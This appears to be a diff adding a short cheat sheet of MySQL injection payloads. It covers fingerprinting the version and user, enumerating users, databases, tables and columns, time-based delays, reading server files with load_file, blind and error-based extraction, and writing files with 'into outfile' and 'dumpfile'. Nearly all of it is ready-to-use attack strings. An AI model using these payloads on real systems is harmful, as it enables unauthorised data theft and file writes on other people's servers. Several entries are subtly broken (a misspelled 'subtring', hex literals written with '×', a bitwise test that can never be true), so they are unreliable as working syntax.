@@ -1,0 +1,43 @@
+MySQL Payload
+=====================================
+
+- Version 
+    - ``SELECT @@version``
+- Comment 
+    - ``SELECT 1 -- comment``
+    - ``SELECT 1 # comment``
+    - ``SELECT /*comment*/1``
+- Current User
+    - ``SELECT user()``
+    - ``SELECT system_user()``
+- List User
+    - ``SELECT user FROM mysql.user``
+- Current Database
+    - ``SELECT database()``
+- List Database
+    - ``SELECT schema_name FROM information_schema.schemata``
+- List Tables
+    - ``SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
+- List Columns
+    - ``SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
+- If
+    - ``SELECT if(1=1,'foo','bar');`` return 'foo'
+- Ascii
+    - ``SELECT char(0×41)``
+    - ``SELECT ascii('A')``
+    - ``SELECT 0×414243`` => return ``ABC``
+- Delay
+    - ``sleep(1)``
+    - ``SELECT BENCHMARK(1000000,MD5('A'))``
+- Read File
+    - ``select @@datadir``
+    - ``select load_file('databasename/tablename.MYD')``
+- Blind
+    - ``ascii(subtring(str,pos,length)) & 32 == 1``
+- Error Based
+    - ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
+- Write File
+    - ``union select 1,1,1 into outfile '/tmp/demo.txt'``
+    - ``union select 1,1,1 into dumpfile '/tmp/demo.txt'``
+    - dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏
+
